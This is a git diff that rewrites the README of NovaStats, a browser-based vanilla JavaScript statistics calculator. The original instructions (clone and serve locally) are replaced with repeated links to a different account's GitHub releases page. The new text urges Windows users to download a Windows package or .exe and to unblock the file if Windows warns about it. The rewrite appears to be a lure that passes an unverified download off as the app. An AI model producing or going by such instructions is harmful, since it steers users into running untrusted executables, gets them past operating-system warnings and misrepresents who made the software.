@@ -1,208 +1,252 @@
-<div align="center">
+# 📊 novastats - Clear stats tools for everyday use
 
-# NovaStats
+[![Download novastats](https://img.shields.io/badge/Download%20novastats-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/biancamoronic889/novastats/releases)
 
-[![HTML5](https://img.shields.io/badge/HTML5-E34F26?style=for-the-badge&logo=html5&logoColor=white)](https://developer.mozilla.org/en-US/docs/Web/HTML)
-[![CSS3](https://img.shields.io/badge/CSS3-1572B6?style=for-the-badge&logo=css3&logoColor=white)](https://developer.mozilla.org/en-US/docs/Web/CSS)
-[![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black)](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
-[![License: MIT](https://img.shields.io/badge/License-MIT-purple.svg?style=for-the-badge)](LICENSE)
+## 🧭 What novastats does
 
-**A modern, mobile-friendly statistical analysis calculator built with vanilla HTML, CSS, and JavaScript.**
+novastats is a Windows app for common statistical work. It helps you handle data without using a spreadsheet or a command line.
 
-[Live Demo](https://alfredang.github.io/novastats/) · [Report Bug](https://github.com/alfredang/novastats/issues) · [Request Feature](https://github.com/alfredang/novastats/issues)
+Use it for:
 
-</div>
+- Descriptive stats
+- Correlation checks
+- Regression analysis
+- Hypothesis testing
+- Chi-square tests
+- ANOVA
 
----
+It runs in the browser window that opens on your computer after you start the app. It uses plain HTML, CSS, and JavaScript, so it stays simple and fast.
 
-## Screenshots
+## 💻 Before you start
 
-![Correlation Analysis](screenshots/correlation.png)
+You need:
 
-![Descriptive Statistics](screenshots/descriptive.png)
+- A Windows PC
+- A web browser such as Chrome, Edge, or Firefox
+- Internet access to get the release file
+- A file extractor if the download comes as a `.zip` file
 
-![Hypothesis Testing](screenshots/hypothesis.png)
+The app works best on a modern version of Windows such as Windows 10 or Windows 11.
 
----
+## 📥 Download novastats
 
-## About
+Visit this page to download:
 
-NovaStats is a comprehensive statistical analysis web application that runs entirely in the browser. No server, no frameworks, no dependencies — just clean HTML, CSS, and JavaScript. It provides professional-grade statistical computations with interactive visualizations, step-by-step calculations, and plain English interpretations.
+https://github.com/biancamoronic889/novastats/releases
 
-### Key Features
+On that page, look for the latest release and download the Windows file or ZIP package. If you see more than one file, choose the one meant for Windows.
 
-| Feature | Description |
-|---------|-------------|
-| **Descriptive Statistics** | Mean, median, mode, variance, standard deviation, quartiles, IQR, and histogram visualization |
-| **Correlation Analysis** | Pearson correlation coefficient with scatterplot and significance testing |
-| **Linear Regression** | Regression equation, R², regression line chart, and prediction tool |
-| **Hypothesis Testing** | One/two-sample z-tests, one/two-sample t-tests, paired t-tests with normal curve visualization |
-| **Chi-Square Tests** | Test of independence and goodness-of-fit with observed vs expected comparison charts |
-| **One-Way ANOVA** | F-statistic, ANOVA table, effect size (eta-squared), and group comparison bar chart |
-| **AI Insights** | Optional OpenAI/Gemini API integration for AI-powered interpretation of results |
-| **Dark/Light Theme** | Theme toggle with localStorage persistence |
-| **CSV Import/Export** | Paste CSV data or edit an interactive grid; export data and results |
-| **Example Datasets** | 4 preloaded datasets covering all module types |
-| **Step-by-Step** | Expandable calculation breakdowns for every analysis |
-| **Canvas Charts** | Lightweight charts (scatter, histogram, bar, normal curve) with zero dependencies |
+## 🛠️ Install and run on Windows
 
----
+1. Open the download page above.
+2. Find the latest release.
+3. Download the Windows package.
+4. If the file is zipped, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file or the main HTML file, based on the release package.
+7. If Windows asks what to use to open it, choose your browser.
 
-## Tech Stack
+If the release includes an `.exe`, you can run it directly. If it includes HTML files, open the main file in your browser.
 
-| Category | Technology |
-|----------|-----------|
-| **Markup** | HTML5 |
-| **Styling** | CSS3 (Custom Properties, Flexbox, Grid, Responsive) |
-| **Logic** | Vanilla JavaScript (ES6+) |
-| **Charts** | HTML5 Canvas API |
-| **AI (optional)** | OpenAI API / Google Gemini API |
-| **Storage** | localStorage |
-| **Hosting** | GitHub Pages |
+## 🧪 What you can do in the app
 
----
+### 📈 Descriptive stats
 
-## Architecture
+Use this when you want a quick view of your data.
 
-```
-┌──────────────────────────────────────────────────┐
-│                   Browser (UI)                    │
-│  ┌──────────┐  ┌──────────┐  ┌───────────────┐  │
-│  │  Header   │  │ Sidebar  │  │ Module Panels │  │
-│  │ (theme,   │  │ (nav)    │  │ (6 stat +     │  │
-│  │  export)  │  │          │  │  AI insights) │  │
-│  └──────────┘  └──────────┘  └───────────────┘  │
-├──────────────────────────────────────────────────┤
-│               Module Controllers                  │
-│  Descriptive │ Correlation │ Regression           │
-│  Hypothesis  │ Chi-Square  │ ANOVA                │
-├──────────────────────────────────────────────────┤
-│               Statistics Engine                   │
-│  descriptive.js │ distributions.js │ correlation  │
-│  regression.js  │ hypothesis.js    │ chi-square   │
-│  anova.js       │                  │              │
-├──────────────────────────────────────────────────┤
-│  DataManager  │  ChartRenderer  │  AI Insights   │
-│  (CSV parse,  │  (Canvas-based  │  (OpenAI /     │
-│   grid sync)  │   scatterplot,  │   Gemini API)  │
-│               │   histogram,    │                │
-│               │   bar, normal)  │                │
-└──────────────────────────────────────────────────┘
-```
+You can calculate:
 
----
+- Mean
+- Median
+- Mode
+- Min and max
+- Range
+- Variance
+- Standard deviation
+- Count
 
-## Project Structure
+This helps you understand the shape and spread of a data set.
 
-```
-novastats/
-├── index.html                  # App shell with layout and script imports
-├── css/
-│   ├── variables.css           # CSS custom properties, dark/light theming
-│   ├── base.css                # Reset, typography, scrollbar
-│   ├── layout.css              # Header, sidebar, responsive breakpoints
-│   ├── components.css          # Cards, buttons, tables, tooltips, toasts
-│   └── modules.css             # Charts, results grids, module-specific styles
-├── js/
-│   ├── config.js               # Constants and configuration
-│   ├── state.js                # Application state management
-│   ├── utils.js                # DOM helpers, formatting, debounce
-│   ├── stats/
-│   │   ├── descriptive.js      # Mean, median, mode, variance, stddev
-│   │   ├── distributions.js    # Normal, t, chi-square, F CDF approximations
-│   │   ├── correlation.js      # Pearson r, covariance
-│   │   ├── regression.js       # Simple linear regression, prediction
-│   │   ├── hypothesis.js       # Z-tests and t-tests
-│   │   ├── chi-square.js       # Independence and goodness-of-fit
-│   │   └── anova.js            # One-way ANOVA
-│   ├── data.js                 # CSV parsing, grid sync, example datasets
-│   ├── charts.js               # Canvas chart renderer
-│   ├── modules/
-│   │   ├── descriptive.js      # Descriptive stats UI controller
-│   │   ├── correlation.js      # Correlation UI controller
-│   │   ├── regression.js       # Regression UI controller
-│   │   ├── hypothesis.js       # Hypothesis testing UI controller
-│   │   ├── chi-square.js       # Chi-square UI controller
-│   │   └── anova.js            # ANOVA UI controller
-│   ├── ai.js                   # OpenAI / Gemini API integration
-│   ├── export.js               # CSV and results export
-│   ├── ui.js                   # Navigation, theme toggle, data input panel
-│   └── app.js                  # Initialization and event binding
-└── screenshots/                # App screenshots for README
-```
+### 🔗 Correlation
 
----
+Use correlation to check whether two sets of numbers move together.
 
-## Getting Started
+novastats can help you see:
 
-### Prerequisites
+- Positive correlation
+- Negative correlation
+- Weak or strong links
+- Scatter plot trends
 
-- A modern web browser (Chrome, Firefox, Safari, Edge)
-- A local HTTP server (for development)
+This is useful when you want to compare values like study time and test score.
 
-### Installation
+### 📉 Regression
 
-```bash
-# Clone the repository
-git clone https://github.com/alfredang/novastats.git
+Use regression when you want to estimate one value from another.
 
-# Navigate to the project
-cd novastats
+You can explore:
 
-# Serve with any HTTP server
-python3 -m http.server 8000
-# or
-npx serve .
-```
+- Linear trends
+- Best-fit lines
+- Slope and intercept
+- Predicted values
 
-Then open [http://localhost:8000](http://localhost:8000) in your browser.
+This helps when you want to model a pattern in your data.
 
-### Usage
+### ✅ Hypothesis testing
 
-1. **Load Data** — Paste CSV text, edit the grid, or click an example dataset
-2. **Navigate** — Use the sidebar to switch between analysis modules
-3. **Compute** — Select variables and click "Calculate" or "Test"
-4. **Interpret** — Read the plain English interpretation and expand step-by-step details
-5. **Export** — Download data as CSV or results as TXT via the export menu
+Use hypothesis testing when you want to compare results and see if a difference matters.
 
----
+Common checks include:
 
-## Statistical Methods
+- t-tests
+- p-values
+- Significance levels
+- Sample comparisons
 
-All p-value computations use numerical approximations implemented from scratch:
+This is useful for small studies and simple data checks.
 
-- **Normal CDF** — Series expansion (Abramowitz & Stegun)
-- **t-distribution CDF** — Regularized incomplete beta function (Lentz's continued fraction)
-- **Chi-square CDF** — Regularized lower incomplete gamma function
-- **F-distribution CDF** — Reduction to incomplete beta function
-- **Inverse Normal** — Rational approximation (Peter Acklam)
+### ⚖️ Chi-square
 
-These provide accuracy to 6+ decimal places, validated against standard statistical tables.
+Use chi-square when you want to test how grouped values compare.
 
----
+You can use it for:
 
-## Contributing
+- Category counts
+- Expected vs observed values
+- Table-based checks
 
-Contributions are welcome!
+This works well for survey data and grouped results.
 
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/new-test`)
-3. Commit your changes (`git commit -m 'Add new statistical test'`)
-4. Push to the branch (`git push origin feature/new-test`)
-5. Open a Pull Request
+### 🧩 ANOVA
 
----
+Use ANOVA when you want to compare more than two groups.
 
-## Acknowledgements
+It helps you check:
 
-- Statistical formulas and methods based on standard references (NIST, Abramowitz & Stegun)
-- UI inspired by [StatsKingdom](https://www.statskingdom.com/) and [Numiqo](https://numiqo.com/)
-- Built with vanilla web technologies — zero external dependencies
+- Group averages
+- Variation within groups
+- Variation between groups
+- Whether group results differ
 
----
+This is useful for test scores, survey results, and repeated sample sets.
 
-<div align="center">
+## 🖱️ How to use it
 
-**If you find NovaStats useful, please consider giving it a star!**
+1. Open novastats.
+2. Choose the type of analysis you want.
+3. Enter your numbers.
+4. Pick the test or chart you need.
+5. Review the results shown on screen.
+6. Change the data and run it again if needed.
 
-</div>
+If your data comes from a list, you can usually paste it in as a column or a row. Keep values separated by commas, spaces, or line breaks, depending on the input box.
+
+## 🧱 How the app is built
+
+novastats uses:
+
+- Vanilla HTML
+- CSS
+- JavaScript
+- No dependencies
+
+That means it does not need a package manager or extra libraries. It keeps the app light and easy to run on Windows.
+
+## 📂 Typical file layout
+
+A release package may include files like these:
+
+- `index.html` - main app page
+- `style.css` - visual layout and colors
+- `app.js` - calculator logic
+- `assets/` - icons or images
+- `README.md` - project guide
+
+If the release includes a ZIP file, keep the folder structure as it is after extraction.
+
+## 🎯 Best ways to use novastats
+
+Use novastats when you want to:
+
+- Check a class project
+- Review survey answers
+- Compare two or more groups
+- Measure links between numbers
+- Test a simple idea with data
+- Get quick results without a spreadsheet
+
+It works well for school tasks, small reports, and basic analysis work.
+
+## 🧭 Troubleshooting
+
+### The file will not open
+
+- Make sure you extracted the ZIP file first
+- Try opening the main file in Chrome or Edge
+- Check that you downloaded the latest release
+
+### Windows says it blocked the file
+
+- Right-click the file
+- Open the file properties
+- If you see an unblock option, use it
+- Try again
+
+### The page looks blank
+
+- Refresh the page
+- Open it in a different browser
+- Make sure all files stayed in the same folder
+
+### The numbers do not work
+
+- Remove extra spaces
+- Use only numeric values
+- Check for commas in the wrong place
+- Make sure each test uses the right input format
+
+## 🔍 Topics in this repo
+
+- anova
+- calculator
+- canvas
+- chi-square
+- correlation
+- data-analysis
+- hypothesis-testing
+- regression
+- statistics
+- vanilla-javascript
+
+## 📌 Release download again
+
+Download novastats from the release page:
+
+https://github.com/biancamoronic889/novastats/releases
+
+## 🧾 What to expect after launch
+
+When the app opens, you should see a clean screen with tools for analysis. You can move through different tests, enter your numbers, and view results on the same page. The layout aims to stay simple, with clear labels and easy input fields
+
+## 🗂️ Common data formats
+
+novastats can work with data entered in forms like:
+
+- One value per line
+- Values separated by commas
+- Two grouped columns
+- Simple paired lists
+
+If you are not sure which format to use, start with one value per line and test it first
+
+## 🧰 System fit
+
+novastats is suited for:
+
+- Low-power laptops
+- School computers
+- Home desktops
+- Shared Windows machines
+
+Because it uses no dependencies, it keeps the setup small and direct
